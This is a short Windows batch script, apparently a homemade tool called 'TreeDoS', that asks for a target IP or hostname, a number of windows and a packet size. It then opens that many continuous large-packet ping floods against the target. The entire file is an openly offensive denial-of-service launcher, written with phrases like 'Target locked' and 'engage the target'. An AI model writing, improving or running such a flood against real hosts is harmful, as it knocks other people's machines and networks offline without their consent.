@echo off
title TreeDoS - DDoS Launch Wizard
color 0A
echo TreeDoS by Three
echo Set target
set /p ip=IP or Hostname:
echo Set Number of Terminals (More - more likely to crash machine, harder punch)
set /p c=Number of Terminals:
echo Set Packet Size
set /p p=bytes:
set v = 0
echo Scanning IP
ping %ip%
echo If no reply, close program.
pause
echo Target locked.
echo Press any key to engage the target.
pause>nul
:ddos
if %c%==%v% goto end
start ping -t -l %p% %ip%
set /a v=v+=1
goto ddos
:end
msg * "Sending Status CMD prompt to screen"
start ping -t %ip% 
exit